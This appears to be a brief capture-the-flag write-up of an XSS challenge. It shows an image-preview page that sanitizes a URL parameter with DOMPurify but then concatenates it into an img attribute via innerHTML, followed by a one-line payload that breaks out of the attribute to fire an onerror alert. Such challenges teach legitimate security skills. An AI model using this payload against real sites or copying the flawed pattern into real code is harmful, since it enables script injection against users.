# Challenge 1

## Inject an alert("Wizer")

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Image preview</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.1/purify.min.js"
            integrity="sha512-TU4FJi5o+epsahLtM9OFRvH2gXmmlzGlysk9wtTFgbYbMvFzh3Cw1l3ubnYIvBiZCC/aurRHS408TeEbcuOoyQ=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>
<body>
    <h1>Preview an image</h1>
    <span id="image"></span>
    <script>
        // Get the image GET parameter
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        const imageParam = urlParams.get('image')

        // Using DOMPurify to sanitize user input!
        const url = DOMPurify.sanitize(imageParam);
        const image = "<img src=\"" + url + "\">";
        document.getElementById('image').innerHTML = image;
    </script>
</body>
</html>
```

## Solution

```text
index.html?image=test%20%22%20onerror=%22alert(%27Wizer%27)
```
